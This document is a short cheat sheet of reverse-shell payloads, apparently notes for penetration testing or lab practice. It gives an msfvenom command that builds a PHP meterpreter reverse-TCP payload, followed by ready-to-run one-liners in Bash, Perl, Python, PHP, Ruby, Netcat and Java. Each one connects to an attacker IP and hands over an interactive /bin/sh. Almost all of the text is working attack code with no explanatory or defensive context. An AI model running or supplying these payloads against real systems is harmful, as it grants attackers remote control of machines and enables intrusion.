Can create more shells here: https://www.revshells.com/

### msfvenom

> sudo msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.15.73 LPORT=4444 -f raw > /home/kali/msfshelly.php

### Bash 

```
bash -i >& /dev/tcp/10.11.0.32/1234 0>&1
```

### Perl
```
perl -e 'use Socket;$i="10.11.0.32";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.32",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP

```
php -r '$sock=fsockopen("10.11.0.32",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby

```
ruby -rsocket -e'f=TCPSocket.open("10.11.0.32",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat

```
nc -e /bin/sh 10.11.0.32 1234
```

or if you have a different version installed:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.32 1234 >/tmp/f
```

### Java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.11.0.32/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
